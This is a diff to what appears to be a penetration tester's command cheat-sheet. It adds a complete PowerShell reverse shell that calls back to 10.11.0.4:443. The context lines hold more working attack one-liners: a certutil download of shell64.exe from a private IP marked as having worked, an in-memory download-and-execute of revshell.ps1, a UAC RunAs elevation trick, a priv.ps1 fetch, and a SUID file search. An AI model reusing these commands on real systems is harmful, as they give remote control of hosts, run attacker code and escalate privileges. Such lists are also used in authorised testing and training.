@@ -154,6 +154,9 @@ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
 find / -type f -perm -4000 2>/dev/null
 wget http://blog.stackexchange.com/ -OutFile out.html
 //WORKED: certutil -urlcache -split -f http://10.10.14.85:7878/shell64.exe C:\\users\\public\\shell64.exe
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
 cmd /c powershell -c (New-Object System.Net.WebClient).DownloadString('http://10.10.14.85:7878/revshell.ps1') | powershell -noprofile -;
 powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c cd /d %CD% && %*'"
 powershell '(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.98:7878/priv.ps1","priv.ps1")'
